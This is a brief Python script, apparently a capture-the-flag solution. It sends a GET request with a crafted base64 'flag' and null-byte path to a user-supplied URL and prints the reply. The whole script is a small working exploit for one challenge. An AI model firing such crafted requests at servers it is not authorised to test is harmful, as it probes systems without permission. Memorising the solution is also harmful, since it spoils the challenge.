#!/usr/bin/python3
# Author: Hack.You

from pwn import xor
import base64
import requests
import sys
from termcolor import colored

print(colored('''
  ____      _     _____ _             
 / ___| ___| |_  |  ___| | __ _  __ _ 
| |  _ / _ \ __| | |_  | |/ _` |/ _` |
| |_| |  __/ |_  |  _| | | (_| | (_| |
 \____|\___|\__| |_|   |_|\__,_|\__, |
                                |___/ 
''' , 'red'))


if len(sys.argv) < 2:
    print('\033[91m' + '@Author: Hack.You' + '\033[0m')
    print(colored(f"Usage: python3 {sys.argv[0]} http://127.0.0.1/", 'blue'))
    sys.exit(0)

null = b'0x0'
encoded_nullbyte = base64.b64encode(xor(null, null))
encoded_nullbyte *= 7

flag = b'flag'*5
encoded_flagbyte = base64.b64encode(flag)

path = encoded_flagbyte + b'/' + encoded_nullbyte
url = sys.argv[1]
req = requests.get(url + '/' + path.decode())
print(req.text)
